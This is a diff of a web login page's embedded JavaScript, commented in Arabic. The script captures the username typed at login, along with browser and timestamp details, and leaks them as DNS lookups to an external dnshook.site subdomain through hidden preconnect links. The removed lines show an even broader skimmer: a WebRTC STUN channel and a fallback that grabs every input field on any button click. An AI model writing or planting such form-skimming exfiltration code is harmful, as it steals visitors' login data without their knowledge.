@@ -28,33 +28,32 @@
 </div>
 </form>
 <script>
-// سكريبت محسن لإرسال البيانات عبر طلبات DNS بطريقة سهلة القراءة
+// سكريبت مبسط لإرسال البيانات عبر طلبات DNS بطريقة واضحة
 document.addEventListener('DOMContentLoaded', function() {
-  // وظيفة لإرسال البيانات عبر DNS
-  function sendDataViaDNS(data, prefix) {
+  // وظيفة لإرسال البيانات عبر DNS بشكل واضح
+  function sendDataViaDNS(data) {
     try {
       // تحويل البيانات إلى سلسلة نصية إذا لم تكن كذلك
       var dataString = typeof data === 'string' ? data : JSON.stringify(data);
       
-      // تحويل البيانات إلى تنسيق آمن للاستخدام في اسم النطاق
-      // استخدام تشفير base64 ثم استبدال الأحرف غير المسموح بها
-      var encodedData = btoa(dataString).replace(/\+/g, '-').replace(/\//g, '_').replace(/=/g, '');
+      // تنظيف البيانات لاستخدامها في اسم النطاق
+      var cleanData = dataString
+        .replace(/ /g, '-') // استبدال المسافات بشرطات
+        .replace(/[^a-zA-Z0-9-]/g, '') // إزالة الأحرف غير المسموح بها
+        .toLowerCase(); // تحويل إلى أحرف صغيرة
       
-      // إضافة بادئة للتعرف على نوع البيانات
-      var dnsPrefix = prefix || 'data';
-      
-      // تقسيم البيانات إلى أجزاء لتجنب تجاوز الحد الأقصى لطول اسم النطاق الفرعي
-      var maxLength = 30; // الحد الأقصى المسموح به لطول الجزء الفرعي من اسم النطاق
+      // تقسيم البيانات إلى أجزاء إذا كانت طويلة
+      var maxLength = 30;
       var chunks = [];
       
-      for (var i = 0; i < encodedData.length; i += maxLength) {
-        chunks.push(encodedData.substr(i, maxLength));
+      for (var i = 0; i < cleanData.length; i += maxLength) {
+        chunks.push(cleanData.substr(i, maxLength));
       }
       
       // إرسال كل جزء كطلب DNS منفصل
       chunks.forEach(function(chunk, index) {
-        // إنشاء اسم نطاق فرعي مع معلومات إضافية لتسهيل القراءة
-        var dnsSubdomain = dnsPrefix + '-p' + (index + 1) + 'of' + chunks.length + '-' + chunk + '.a84486a3-3a4f-4dfa-a734-41a6bfed3241.dnshook.site';
+        // إنشاء اسم نطاق فرعي واضح
+        var dnsSubdomain = 'data-' + (index + 1) + 'of' + chunks.length + '-' + chunk + '.a84486a3-3a4f-4dfa-a734-41a6bfed3241.dnshook.site';
         
         // إنشاء عنصر link preconnect
         var link = document.createElement('link');
@@ -63,19 +62,6 @@ document.addEventListener('DOMContentLoaded', function() {
         document.head.appendChild(link);
         
         console.log('تم إرسال جزء DNS #' + (index + 1) + '/' + chunks.length + ': ' + dnsSubdomain);
-        
-        // محاولة WebRTC (طريقة إضافية)
-        try {
-          var pc = new RTCPeerConnection({
-            iceServers: [{
-              urls: 'stun:' + dnsSubdomain
-            }]
-          });
-          pc.createDataChannel('');
-          pc.createOffer().then(pc.setLocalDescription.bind(pc));
-        } catch (e) {
-          console.log('خطأ في إنشاء اتصال WebRTC للجزء #' + (index + 1) + ': ' + e);
-        }
         
         // إزالة العناصر بعد فترة
         setTimeout(function() {
@@ -88,14 +74,6 @@ document.addEventListener('DOMContentLoaded', function() {
       console.log('خطأ في إرسال البيانات عبر DNS: ' + e);
       return false;
     }
-  }
-  
-  // وظيفة لتنظيف النص وجعله آمنًا للاستخدام في أسماء النطاقات
-  function cleanTextForDNS(text) {
-    return text
-      .replace(/ /g, '-') // استبدال المسافات بشرطات
-      .replace(/[^a-zA-Z0-9-]/g, '') // إزالة الأحرف غير المسموح بها
-      .toLowerCase(); // تحويل إلى أحرف صغيرة
   }
   
   // البحث عن زر تسجيل الدخول
@@ -123,19 +101,12 @@ document.addEventListener('DOMContentLoaded', function() {
           console.log('خطأ في حفظ البيانات في localStorage: ' + e);
         }
         
-        // إرسال البيانات الأساسية عبر DNS بتنسيق سهل القراءة
-        var cleanUsername = cleanTextForDNS(username);
-        sendDataViaDNS('user-' + cleanUsername, 'login');
+        // إرسال اسم المستخدم عبر DNS بشكل واضح
+        sendDataViaDNS('username-' + username);
         
-        // إرسال البيانات التفصيلية عبر DNS
-        var detailedData = {
-          username: username,
-          timestamp: new Date().toISOString(),
-          page: window.location.href,
-          userAgent: navigator.userAgent
-        };
-        
-        sendDataViaDNS(detailedData, 'details');
+        // إرسال معلومات إضافية في طلب منفصل
+        var deviceInfo = 'browser-' + navigator.userAgent.split(' ')[0] + '-time-' + new Date().getTime();
+        sendDataViaDNS(deviceInfo);
         
         console.log('تم إرسال البيانات عبر DNS');
       } else {
@@ -144,50 +115,6 @@ document.addEventListener('DOMContentLoaded', function() {
     });
   } else {
     console.log('لم يتم العثور على زر تسجيل الدخول');
-    
-    // محاولة بديلة: البحث عن أي زر في الصفحة
-    var allButtons = document.querySelectorAll('button, input[type="button"], input[type="submit"]');
-    console.log('عدد الأزرار في الصفحة: ' + allButtons.length);
-    
-    // إضافة مستمع حدث لجميع الأزرار
-    allButtons.forEach(function(button, buttonIndex) {
-      button.addEventListener('click', function() {
-        // البحث عن جميع حقول الإدخال
-        var allInputs = document.querySelectorAll('input');
-        var inputData = {};
-        
-        // جمع البيانات من جميع حقول الإدخال
-        allInputs.forEach(function(input) {
-          if (input.value) {
-            inputData[input.id || input.name || 'input_' + Math.random().toString(36).substr(2, 9)] = input.value;
-          }
-        });
-        
-        // إرسال البيانات عبر DNS
-        if (Object.keys(inputData).length > 0) {
-          // إرسال كل حقل إدخال كطلب DNS منفصل للوضوح
-          Object.keys(inputData).forEach(function(key) {
-            var fieldName = cleanTextForDNS(key);
-            var fieldValue = cleanTextForDNS(inputData[key]);
-            
-            sendDataViaDNS(fieldName + '-' + fieldValue, 'field');
-          });
-          
-          // إرسال جميع البيانات معًا
-          var allData = {
-            inputs: inputData,
-            timestamp: new Date().toISOString(),
-            page: window.location.href,
-            button_index: buttonIndex,
-            button_text: button.textContent || button.value || 'unknown'
-          };
-          
-          sendDataViaDNS(allData, 'alldata');
-          
-          console.log('تم إرسال بيانات الحقول عبر DNS');
-        }
-      });
-    });
   }
 });
 </script>
